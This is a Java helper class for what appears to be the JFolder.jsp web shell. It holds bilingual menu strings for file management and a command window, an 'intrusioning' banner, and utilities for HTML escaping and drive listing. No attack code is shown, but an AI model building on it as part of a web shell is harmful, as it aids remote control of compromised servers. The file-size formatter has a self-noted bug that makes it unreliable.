package org.zl.jf;

import java.io.File;

public class CommonUtil {

	public final static int languageNo=0; //语言版本，0 : 中文； 1：英文
	public final static String strThisFile="JFolder.jsp";
	public final static  String[] authorInfo={" <font color=red> /Memory,intrusioning.. </font>"," <font color=red> Thanks for your support </font>"};
	public final static  String[] strFileManage   = {"文 件 管 理","File Management"};
	public final static  String[] strCommand      = {"CMD 命 令","Command Window"};
	public final static  String[] strSysProperty  = {"系 统 属 性","System Property"};
	public final static  String[] strHelp         = {"帮 助","Help"};
	public final static  String[] strParentFolder = {"上级目录","Parent Folder"};
	public final static  String[] strCurrentFolder= {"当前目录","Current Folder"};
	public final static  String[] strDrivers      = {"驱动器","Drivers"};
	public final static  String[] strFileName     = {"文件名称","File Name"};
	public final static  String[] strFileSize     = {"文件大小","File Size"};
	public final static  String[] strLastModified = {"最后修改","Last Modified"};
	public final static  String[] strFileOperation= {"文件操作","Operations"};
	public final static  String[] strFileEdit     = {"修改","Edit"};
	public final static  String[] strFileDown     = {"下载","Download"};
	public final static  String[] strFileCopy     = {"复制","Move"};
	public final static  String[] strFileDel      = {"删除","Delete"};
	public final static  String[] strExecute      = {"执行","Execute"};
	public final static  String[] strBack         = {"返回","Back"};
	public final static  String[] strFileSave     = {"保存","Save"};

	public static String formatPath(String p)
	{
		StringBuffer sb=new StringBuffer();
		for (int i = 0; i < p.length(); i++) 
		{
			if(p.charAt(i)=='\\')
			{
				sb.append("\\\\");
			}
			else
			{
				sb.append(p.charAt(i));
			}
		}
		return sb.toString();
	}

	/**
	 * Converts some important chars (int) to the corresponding html string
	 */
	public static String conv2Html(int i) {
		if (i == '&') return "&amp;";
		else if (i == '<') return "&lt;";
		else if (i == '>') return "&gt;";
		else if (i == '"') return "&quot;";
		else return "" + (char) i;
	}

	/**
	 * Converts a normal string to a html conform string
	 */
	public static String htmlEncode(String st) {
		StringBuffer buf = new StringBuffer();
		for (int i = 0; i < st.length(); i++) {
			buf.append(conv2Html(st.charAt(i)));
		}
		return buf.toString();
	}
	
	
	public static String getDrivers()
	/**
	Windows系统上取得可用的所有逻辑盘
	*/
	{
		StringBuffer sb=new StringBuffer(strDrivers[languageNo] + " : ");
		File roots[]=File.listRoots();
		for(int i=0;i<roots.length;i++)
		{
			sb.append(" <a href=\"javascript:doForm('','"+roots[i]+"\\','','','1','');\">");
			sb.append(roots[i]+"</a>&nbsp;");
		}
		return sb.toString();
	}
	static String convertFileSize(long filesize)
	{
		//bug 5.09M 显示5.9M
		String strUnit="Bytes";
		String strAfterComma="";
		int intDivisor=1;
		if(filesize>=1024*1024)
		{
			strUnit = "MB";
			intDivisor=1024*1024;
		}
		else if(filesize>=1024)
		{
			strUnit = "KB";
			intDivisor=1024;
		}
		if(intDivisor==1) return filesize + " " + strUnit;
		strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor ;
		if(strAfterComma=="") strAfterComma=".0";
		return filesize / intDivisor + "." + strAfterComma + " " + strUnit;
	}
}
